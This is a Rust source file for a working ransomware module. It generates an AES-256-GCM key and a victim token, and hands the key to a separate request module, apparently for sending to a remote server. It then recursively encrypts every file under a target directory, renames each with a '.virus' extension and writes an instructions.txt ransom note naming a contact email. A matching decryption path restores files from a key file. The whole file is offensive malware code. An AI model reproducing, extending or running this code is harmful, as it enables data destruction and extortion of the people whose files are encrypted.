use std::fs;
use ring::{aead::*, rand};

use crate::req;

const EXT: &str = ".virus";

struct Key<'a>{
    key: LessSafeKey,
    vec: [u8; 32],
    dir: &'a str
}

impl<'a> Key<'a>{
    fn new() -> Self{
        let rng = rand::SystemRandom::new();
        let vec: [u8; 32] = rand::generate(&rng).unwrap().expose();
        let key = LessSafeKey::new(UnboundKey::new(&AES_256_GCM, &vec).unwrap());
        Key{key, vec, dir: ""}
    }

    fn from(vec: Vec<u8>, dir: &'a str) -> Self{
        let key = LessSafeKey::new(UnboundKey::new(&AES_256_GCM, &vec).unwrap());
        Key{key, vec: vec.try_into().expect("Error reading key"), dir}
    }

    fn from_dir(dir: &'a str) -> Result<Self, std::io::Error>{
        let msg = "Error parsing key!";
        let content = fs::read_to_string(dir)?;
        let key: Vec<u8> = content.split(" ")
            .into_iter()
            .map(|i| i
                .parse()
                .expect(msg))
            .collect();

        Ok(Key::from(key, dir))
    }
}

struct Actions{
    inst: fn(&str, Option<&str>) -> Result<(), std::io::Error>,
    function: fn(&Key, &mut Vec<u8>),
    valid: fn(&str, (&str, &str, &str)) -> bool,
    rename: fn(&str) -> Result<(), std::io::Error>
}

impl Actions{
    fn for_encryption() -> Self{
        Actions{
            inst: write_inst,
            function: encrypt,
            valid: valid_enc,
            rename: add_ext
        }
    }

    fn for_decryption() -> Self{
        Actions{
            inst: rem_inst,
            function: decrypt,
            valid: valid_dec,
            rename: rem_ext
        }
    }
}

fn get_self_dir() -> String{
    std::env::current_exe()
        .map(|d| d
            .to_str()
            .unwrap()
            .to_owned())
        .unwrap()
}

fn valid_enc(path: &str, exceptions: (&str, &str, &str)) -> bool{
    !path.ends_with(EXT) && 
    path != exceptions.0 && 
    path != exceptions.1 && 
    path != exceptions.2
}

fn valid_dec(path: &str, exceptions: (&str, &str, &str)) -> bool{
     path.ends_with(EXT) && 
    path != exceptions.0 && 
    path != exceptions.1 && 
    path != exceptions.2
}

fn add_ext(file: &str) -> Result<(), std::io::Error>{
    let new_name = String::from(file) + EXT;
    fs::rename(file, new_name)
}

fn rem_ext(file: &str) -> Result<(), std::io::Error>{
    let new_name = String::from(&file[..file.len() - EXT.len()]);
    fs::rename(file, new_name)
}

fn rem_inst(dir: &str, _: Option<&str>) -> Result<(), std::io::Error>{
    fs::remove_file(dir)
}

fn write_inst(dir: &str, token: Option<&str>) -> Result<(), std::io::Error>{
    let email = "asd@asd.com";
    let mut instructions = String::new();

    instructions += "to get your files back, send the following token to ";
    instructions += email;
    instructions += ":\n";
    instructions += token.unwrap();

    fs::write(dir, instructions)
}

fn generate_token() -> String{
    let rng = rand::SystemRandom::new();
    let vec: [u8; 16] = rand::generate(&rng).unwrap().expose();
    vec.into_iter().map(|i| i.to_string()).collect()
}

fn encrypt(k: &Key, data: &mut Vec<u8>){
    let rng = rand::SystemRandom::new();

    let iv: [u8; 16] = rand::generate(&rng).unwrap().expose();
    let mut iv = Vec::from(iv);
    iv.truncate(12);

    let nonce = Nonce::assume_unique_for_key(iv.clone().try_into().expect("Error"));
    k.key.seal_in_place_append_tag(nonce, Aad::empty(), data).unwrap();
    data.extend(iv);
}

fn decrypt(k: &Key, data: &mut Vec<u8>){
    let iv: Vec<u8> = data.drain(data.len() - 12..).collect();
    let nonce = Nonce::assume_unique_for_key(iv.try_into().expect("Error"));
    k.key.open_in_place(nonce, Aad::empty(), data).unwrap();
    data.truncate(data.len() - AES_256_GCM.tag_len());
}

fn run_virus(k: &Key, act: &Actions, self_dir: &str, dir: &str, token: Option<&str>) -> Result<(), std::io::Error>{
    let paths = fs::read_dir(dir)?;
    let inst_path = format!("{}/instructions.txt", dir);
    let _ = (act.inst)(&inst_path, token);
    
    for path in paths{
        let path = path.unwrap().path();
        let path = path.as_path();
        let path_str = path.to_str().unwrap();

        if path.is_file() && (act.valid)(&path_str, (k.dir, &inst_path, self_dir)){
            if let Ok(mut content) = fs::read(path){
                (act.function)(&k, &mut content);
                let _ = fs::write(&path, content);
                (act.rename)(path_str)?
            }
        }else if path.is_dir(){
            run_virus(&k, act, self_dir, &path_str, token)?
        }
    }

    Ok(())
}

pub fn run(target: &str, key_dir: Option<&str>) -> Result<(), std::io::Error>{
    let self_dir = get_self_dir();
    
    match key_dir{
        Some(dir) => {
            let k = Key::from_dir(dir)?;
            let act = Actions::for_decryption();
            run_virus(&k, &act, &self_dir, target, None)?;
            println!("Files restored!");
        },
        None => {
            let k = Key::new();
            let token = generate_token();
            let act = Actions::for_encryption();

            if let Ok(_) = req::stash_key(&token, &mut Vec::from(k.vec)){
                run_virus(&k, &act, &self_dir, target, Some(&token))?;
                println!("Give me money");
            }
        }
    }

    Ok(())
}
